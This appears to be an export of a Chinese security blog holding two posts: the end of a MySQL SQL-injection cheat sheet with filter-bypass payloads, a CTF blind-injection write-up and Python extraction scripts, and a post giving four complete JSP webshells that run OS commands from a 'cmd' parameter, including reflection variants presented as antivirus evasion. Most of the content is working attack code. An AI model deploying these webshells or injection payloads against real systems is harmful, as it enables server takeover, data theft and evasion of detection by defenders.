<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#包含in</span><br><span class="line">SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();</span><br><span class="line">SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">#不包含in</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line">#通过表文件的存储路径获取表名</span><br><span class="line">SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();</span><br><span class="line"></span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by</span><br><span class="line">table_schema,table_name order by io desc;</span><br><span class="line">#查看所有正在连接的用户详细信息</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br></pre></td></tr></table></figure>

<p><strong>Performance Schema</strong></p>
<p>Performance Schema最早在MYSQL 5.5中引入，而现在5.6、5.7、8.0中Performance-Schema又添加了更多的监控项，用于监控MySQL server在一个较低级别的运行过程中的资源消耗、资源等待等情况。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();</span><br></pre></td></tr></table></figure>

<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p>方法一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql 8.0.19`新增语句`table</span><br><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br><span class="line"></span><br><span class="line">可以把table t简单理解成select * from t，和select的区别在于</span><br><span class="line">table总是显示表的所有列</span><br><span class="line">table不允许任何的行过滤;也就是说，TABLE不支持任何WHERE子句。</span><br><span class="line">可以用来盲注表名</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表/句柄的首行数据</span><br><span class="line">handler hd read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler hd close; #关闭句柄</span><br></pre></td></tr></table></figure>

<p>方法三：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prepare xxx from &quot;sql语句&quot;;</span><br><span class="line">execute xxx;</span><br><span class="line"></span><br><span class="line">由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤</span><br><span class="line">比如过滤了select</span><br><span class="line">PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></figure>

<h3 id="information-schema被过滤"><a href="#information-schema被过滤" class="headerlink" title="information_schema被过滤"></a>information_schema被过滤</h3><p>方法一：</p>
<p>利用mysql5.7新增的<code>sys.schema_auto_increment_columns</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>利用<code>sys.schema_table_statistics_with_buffer</code></p>
<p>方法三：</p>
<p>利用mysql默认存储引擎innoDB携带的表 <code>mysql.innodb_table_stats</code>和</p>
<p>  <code>mysql.innodb_index_stats</code></p>
<p>方法四：</p>
<p>无列名注入</p>
<h4 id="join-using注列名"><a href="#join-using注列名" class="headerlink" title="join-using注列名"></a>join-using注列名</h4><p>通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆表</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span><br><span class="line">获取第一列的列名</span><br><span class="line">?id=-1&#x27; union all select * from (select * from users as a join users as b)as c--+</span><br><span class="line">获取次列及后续列名</span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users b using(id,username))c--+</span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users b using(id,username,password))c--+</span><br><span class="line">数据库中as主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。</span><br></pre></td></tr></table></figure>

<h4 id="利用普通子查询"><a href="#利用普通子查询" class="headerlink" title="利用普通子查询"></a>利用普通子查询</h4><p>假设 <code>user</code>表中存在 列名为<code>id</code>、<code>name</code>、<code>pass</code>、<code>mail</code>、<code>phone</code>，那么利用如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3,4,5 union select * from users; （前提是先尝试出sql中总共有几个列）</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170246019-1523606623.png" alt="image-20220322170246440"></p>
<p>可见数字与users中的列相应，接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3,4,5 union select * from users)a;</span><br><span class="line">//就相当于select pass from (select 1,2,3,4,5 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170339848-796249324.png" alt="image-20220322170340541"></p>
<p>当反引号 &#96; 不能使用的时候，我们可以使用别名来代替：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4,5 union select * from users)a;</span><br><span class="line">select group_concat(b,c) from (select 1,2,3 as b,4 as c,5 union select * from users)a;  //在注入中查询多个列：</span><br></pre></td></tr></table></figure>

<p>过滤了逗号，可以利用join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//无逗号，有join版本</span><br><span class="line">select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</span><br></pre></td></tr></table></figure>



<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>这里列举一个之前参加的中国工业互联网安全大赛联通赛题的一道无列名注入题</p>
<p>题目就一个登录页面，过滤的源码如下，实际环境可以采⽤fuzz，对常⽤关键字进⾏探测，将被过滤的找出来 </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170811575-724738630.png" alt="image-20220322170812383"></p>
<p>通过观察，过滤中最主要将各种用于比较的符号都进行了过滤，只留下了⼀个就是in<br>并且登录接，sql没有回显，明显是布尔盲注，经过测试，payload如下：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password:</span><br><span class="line">abcabc&#x27;/**/or/**/ord(mid((select/**/database()),0,1))/**/in/**/(&#x27;127&#x27;)#</span><br></pre></td></tr></table></figure>

<p>还有⼀个考点就是这里过滤了<code>information</code>，表面上看没办法常规获取表明和字段名，这里采用的绕过方法是使用<code>sys.schema_table_statistics</code>这个表。这个表中存储了所有的数据库和数据表，但是没有字段名 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;xxx&#x27;) GROUP BY table_name limit 0,1</span><br></pre></td></tr></table></figure>

<p>利用无列名注入获取表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a.1 from (select 1,2 union select * from f1a91sH3RE)a limit 1,1</span><br></pre></td></tr></table></figure>

<p>或者想办法获取列名：这里采取的⽅式为:sys.x$statement_analysis这个表，这个表会记录最近用过的语句，因为题目环境为docker，因此建表语句⼀般都存储在该表中，没有被清空，因此可以通过注入这个表，获取到完整的建表语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT query FROM sys.x$statement_analysis</span><br></pre></td></tr></table></figure>

<p>编写python脚本，获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">url = &#x27;http://127.0.0.1:8081/index.php&#x27;</span><br><span class="line"></span><br><span class="line">select = &#x27;password&#x27; #flag-is-not-here</span><br><span class="line">select = &#x27;SELECT table_schema FROM sys.schema_table_statistics GROUP BY</span><br><span class="line">table_schema&#x27; #ctfgame 库名</span><br><span class="line">select = &quot;SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;ctfgame&#x27;) GROUP BY table_name limit 0,1&quot; # f1a91sH3RE 表名</span><br><span class="line">select = &quot;SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;ctfgame&#x27;) GROUP BY table_name limit 1,1&quot; # users</span><br><span class="line">select = &quot;SELECT query FROM sys.x$statement_analysis limit 3,1&quot; # users</span><br><span class="line">select = &quot;SELECT f1aG123 FROM f1a91sH3RE&quot;</span><br><span class="line"># select = &quot;select * from f1a91sH3RE limit 0,1&quot; #注⼊失败 说明不⽌⼀列</span><br><span class="line"># select = &quot;select a.1 from (select 1,2 union select * from f1a91sH3RE)a limit 1,1&quot; #假设有2列 注⼊成功 flag&#123;af65039d-6f2f-9524-d896-e630d03c074c&#125;</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	for j in range(1,130):</span><br><span class="line">		data=&#123;</span><br><span class="line">			&#x27;username&#x27; : &#x27;admin&#x27;,</span><br><span class="line">			&#x27;password&#x27; : f&quot;abcabc&#x27; or ord(mid((&#123;select&#125;),&#123;i&#125;,1)) in</span><br><span class="line">(&#x27;&#123;j&#125;&#x27;)#&quot;.replace(&#x27; &#x27;, &quot;/**/&quot;)</span><br><span class="line">		&#125; </span><br><span class="line">		r = req.post(url, data)</span><br><span class="line">		if &#x27;hacker&#x27; in r.text:</span><br><span class="line">			print(&quot;hacker&quot;)</span><br><span class="line">			exit(0)</span><br><span class="line">		if &#x27;wrong&#x27; not in r.text:</span><br><span class="line">			res += chr(j)</span><br><span class="line">			print(res)</span><br><span class="line">			break</span><br><span class="line">		if j == 129:</span><br><span class="line">			exit(0)</span><br></pre></td></tr></table></figure>

<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#    %23    --+或-- -    ;%00      用引号进行闭合</span><br></pre></td></tr></table></figure>

<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"># 双写绕过</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"># 字符串拼接绕过</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure>

<h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure>

<h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用注释符/**/代替空格:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># 使用加号+代替空格:(只适用于GET方法中)</span><br><span class="line">select+database();</span><br><span class="line"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span><br><span class="line"></span><br><span class="line"># 使⽤括号嵌套:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># 使⽤其他不可⻅字符代替空格:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#利用``分隔进行绕过</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>

<h3 id="过滤比较符号绕过"><a href="#过滤比较符号绕过" class="headerlink" title="过滤比较符号绕过"></a>过滤比较符号绕过</h3><p>使用 in() 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显</span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // 正常回显</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;ip/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure>

<p>使用like绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>使用regexp绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/10594#toc-6">SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结 – cc (ccship.cn)</a></p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/106647880">https://blog.csdn.net/qq_45521281/article/details/106647880</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Jsp Webshell免杀-命令执行</title>
    <url>/2022/03/19/Jsp-Webshell%E5%85%8D%E6%9D%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>Java命令执行的类，主要是<code>Runtime</code>类和<code>ProcessBuilder</code>类，根据这两个类，我们可以编写出经典的jsp webshell，代码以适用windows平台为例</p>
<span id="more"></span>

<h3 id="Runtime类实现命令执行"><a href="#Runtime类实现命令执行" class="headerlink" title="Runtime类实现命令执行"></a>Runtime类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String  cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null)&#123;</span><br><span class="line">        Process p =  Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;);</span><br><span class="line">        InputStream input = p.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        p.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ProcessBuilder类实现命令执行"><a href="#ProcessBuilder类实现命令执行" class="headerlink" title="ProcessBuilder类实现命令执行"></a>ProcessBuilder类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">        String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if(cmd != null)&#123;</span><br><span class="line">            String[] cmds = new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,cmd&#125;;</span><br><span class="line">            ProcessBuilder builder = new ProcessBuilder(cmds);</span><br><span class="line">            Process process = builder.start();</span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line">            InputStreamReader ins = new InputStreamReader(in, &quot;GBK&quot;);</span><br><span class="line">            BufferedReader br = new BufferedReader(ins);</span><br><span class="line">            out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            String line;</span><br><span class="line">            while((line = br.readLine()) != null) &#123;</span><br><span class="line">                out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">            br.close();</span><br><span class="line">            ins.close();</span><br><span class="line">            in.close();</span><br><span class="line">            process.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>利用反射来免杀webshell是常用技术之一</p>
<h3 id="反射获取Runtime类实现命令执行"><a href="#反射获取Runtime类实现命令执行" class="headerlink" title="反射获取Runtime类实现命令执行"></a>反射获取Runtime类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String  cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null) &#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object o = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            o = declaredConstructor.newInstance();</span><br><span class="line">        &#125; catch (InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Method show = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            show = clazz.getDeclaredMethod(&quot;exec&quot;, String[].class);</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object invoke = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            invoke = show.invoke(o, (Object) cmds);</span><br><span class="line">        &#125; catch (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Process invoke1 = (Process) invoke;</span><br><span class="line"></span><br><span class="line">        InputStream input = invoke1.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        invoke1.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="反射获取ProcessBuilder类实现命令执行"><a href="#反射获取ProcessBuilder类实现命令执行" class="headerlink" title="反射获取ProcessBuilder类实现命令执行"></a>反射获取ProcessBuilder类实现命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.print(System.getProperty(&quot;os.name&quot;).toLowerCase());</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(cmd != null)&#123;</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,cmd&#125;;</span><br><span class="line">        Class clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor declaredConstructors = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            declaredConstructors = clazz.getDeclaredConstructor(String[].class);</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object o = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            o = declaredConstructors.newInstance((Object) cmds);</span><br><span class="line">        &#125; catch (InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Method command = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            command = clazz.getDeclaredMethod(&quot;start&quot;);</span><br><span class="line">        &#125; catch (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object invoke = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            invoke = command.invoke(o);</span><br><span class="line">        &#125; catch (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Process invoke1 = (Process) invoke;</span><br><span class="line">        InputStream input = invoke1.getInputStream();</span><br><span class="line">        InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">        BufferedReader br = new BufferedReader(ins);</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        br.close();</span><br><span class="line">        ins.close();</span><br><span class="line">        input.close();</span><br><span class="line">        invoke1.getOutputStream().close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

